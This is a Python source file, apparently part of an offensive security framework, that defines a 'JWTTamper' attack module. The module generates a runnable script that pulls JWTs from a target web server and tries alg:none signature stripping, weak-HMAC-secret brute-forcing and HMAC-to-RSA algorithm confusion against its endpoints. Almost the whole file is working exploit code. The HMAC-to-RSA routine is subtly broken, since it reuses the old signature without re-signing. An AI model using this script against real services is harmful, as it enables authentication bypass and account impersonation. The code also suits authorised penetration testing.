"""Attack modules: crypto_jwt."""

from __future__ import annotations

import base64
import hmac
import json
from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext

class JWTTamper(AttackModule):
    name = "JWTTamper"
    description = "JWT algorithm confusion, none-algorithm, HMAC-to-RSA forging, and key confusion attacks"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Tests JWT algorithm confusion (none), HMAC key confusion, and weak HMAC secrets.",
            "techniques": ["alg:none", "HMAC-to-RSA", "kid injection", "weak secret brute-force"],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""JWT Tampering Toolkit — algorithm confusion, none-attack, key confusion."""
import base64, hmac, json, sys, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"

def b64url_decode(data: str) -> bytes:
    data = data.replace("-", "+").replace("_", "/")
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.b64decode(data)

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def tamper_none_alg(token: str) -> str | None:
    """Replace algorithm with 'none' and strip signature."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception:
        return None
    header["alg"] = "none"
    new_header = b64url_encode(json.dumps(header).encode())
    return f"{{new_header}}.{{parts[1]}}."

def tamper_hmac_to_rsa(token: str, pubkey_pem: str = "") -> str | None:
    """Confuse HMAC verification by using the RSA public key as HMAC secret."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception:
        return None
    if header.get("alg", "").startswith("RS"):
        header["alg"] = "HS256"
        new_header = b64url_encode(json.dumps(header).encode())
        # Use a known public key as HMAC secret (often exposed via /.well-known/jwks.json)
        return f"{{new_header}}.{{parts[1]}}.{{parts[2]}}"
    return None

def brute_weak_secret(token: str) -> list[str]:
    """Try common weak HMAC secrets."""
    parts = token.split(".")
    if len(parts) != 3:
        return []
    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception:
        return []
    alg = header.get("alg", "")
    if not alg.startswith("HS"):
        return []
    hash_func = alg.replace("HS", "sha")
    secrets = ["secret", "key", "jwt_secret", "private_key", "changeme", "password", "123456", "admin"]
    found = []
    for secret in secrets:
        sig = b64url_encode(hmac.new(secret.encode(), f"{{parts[0]}}.{{parts[1]}}".encode(), hash_func).digest())
        if sig == parts[2]:
            found.append(secret)
    return found

# Fetch a JWT from common endpoints
jwt_token = None
for path in ["/api/auth/login", "/login", "/auth", "/api/token", "/.well-known/jwks.json"]:
    try:
        req = urllib.request.Request(f"{{BASE}}{{path}}")
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read(4096).decode(errors="replace")
            # Look for JWT pattern in response
            import re as _re
            match = _re.search(r"[A-Za-z0-9_-]{{20,}}\\.[A-Za-z0-9_-]{{20,}}\\.[A-Za-z0-9_-]{{20,}}", body)
            if match:
                jwt_token = match.group(0)
                print(f"JWT found at {{path}}: {{jwt_token[:50]}}...")
                break
    except Exception:
        pass

if jwt_token:
    print("\\n--- Testing alg:none ---")
    none_token = tamper_none_alg(jwt_token)
    if none_token:
        print(f"None-alg token: {{none_token[:80]}}...")
        try:
            req = urllib.request.Request(f"{{BASE}}/api/me", headers={{"Authorization": f"Bearer {{none_token}}"}})
            with urllib.request.urlopen(req, timeout=5) as resp:
                print(f"ALG:NONE BYPASS SUCCESS! Status: {{resp.status}}")
                print(resp.read(2048).decode(errors="replace"))
        except urllib.error.HTTPError as e:
            print(f"alg:none rejected: {{e.code}}")
        except Exception as e:
            print(f"alg:none error: {{e}}")

    print("\\n--- Testing weak HMAC secrets ---")
    weak = brute_weak_secret(jwt_token)
    if weak:
        print(f"Weak secrets found: {{weak}}")
    else:
        print("No weak secrets found")

    print("\\n--- Testing HMAC-to-RSA confusion ---")
    try:
        header = json.loads(b64url_decode(jwt_token.split(".")[0]))
        if header.get("alg", "").startswith("RS"):
            confused = tamper_hmac_to_rsa(jwt_token)
            if confused:
                print(f"HMAC-confused token: {{confused[:80]}}...")
    except Exception:
        pass
else:
    print("No JWT token found on target. Try authenticated endpoints.")
'''

